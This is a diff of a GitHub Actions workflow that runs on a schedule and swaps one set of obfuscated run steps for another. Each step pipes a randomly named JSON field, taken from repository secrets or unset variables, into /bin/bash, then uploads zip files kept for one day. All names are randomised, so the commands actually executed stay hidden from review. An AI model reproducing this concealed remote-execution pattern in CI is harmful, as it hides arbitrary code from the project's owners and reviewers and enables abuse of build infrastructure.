@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '18 4,10,16,22 * * *'
+    - cron: '45 3,9,15,21 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,17 +16,15 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          md34922: ${{ secrets.md34922 }}
+          ecg51: ${{ secrets.ecg51 }}
         run: |
-          printf '%s' "$md34922" | jq -r .yxwrw7010 | /bin/bash
-          echo $zg429 | jq -r .ue8475 | /bin/bash
-          printf '%s' "$r7019" | jq -r .ifdvh4 | /bin/bash
-          printf '%s' "$w4740" | jq -r .z9 | /bin/bash
-          printf '%s' "$jjub84" | jq -r .mkojq21422 | /bin/bash
+          printf '%s' "$ecg51" | jq -r .pifzi71059 | /bin/bash
+          echo $ukres682 | jq -r .p93 | /bin/bash
+          printf '%s' "$gbg74" | jq -r .i0 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: llOpUsxw
+          name: YCuwU73d
           path: "*.zip"
           retention-days: 1
